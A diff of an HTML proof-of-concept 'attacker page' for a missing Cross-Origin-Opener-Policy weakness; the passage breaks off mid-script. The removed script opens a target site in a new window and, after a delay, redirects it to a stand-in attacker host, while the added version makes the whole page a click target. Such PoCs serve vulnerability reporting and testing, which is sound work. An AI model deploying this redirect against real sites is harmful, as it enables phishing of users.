@@ -2,32 +2,17 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8">
-  <title>COOP POC - Attacker Page</title>
+  <title>POC</title>
+  <style>
+    body { margin: 0; background: white; cursor: pointer; }
+    #msg {
+      position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%);
+      font-family: sans-serif; color: #aaa; font-size: 14px; text-align: center;
+    }
+  </style>
 </head>
-<body style="background:white; cursor:pointer;" onclick="openTarget()">
+<body onclick="openTarget()">
+  <div id="msg">If the site did not automatically redirect to the target, click anywhere in the white background.</div>
 
 <script>
-  const params = new URLSearchParams(window.location.search);
-  const target = params.get('target');
-  let win;
-
-  function openTarget() {
-    if (target) {
-      win = window.open(target, 'victimWindow');
-      setTimeout(redirect, 8000); // wait ~8s then navigate away
-    }
-  }
-
-  function redirect() {
-    if (win && !win.closed) {
-      // If COOP is missing, this cross-origin navigation is possible
-      // because opener still has a handle to the window
-      win.location = 'https://attacker-controlled-site.example.com';
-    }
-  }
-
-  // Auto-open after short delay
-  setTimeout(openTarget, 1500);
-</script>
-</body>
-</html>
+  const params = new URLSearchParams(window.loca
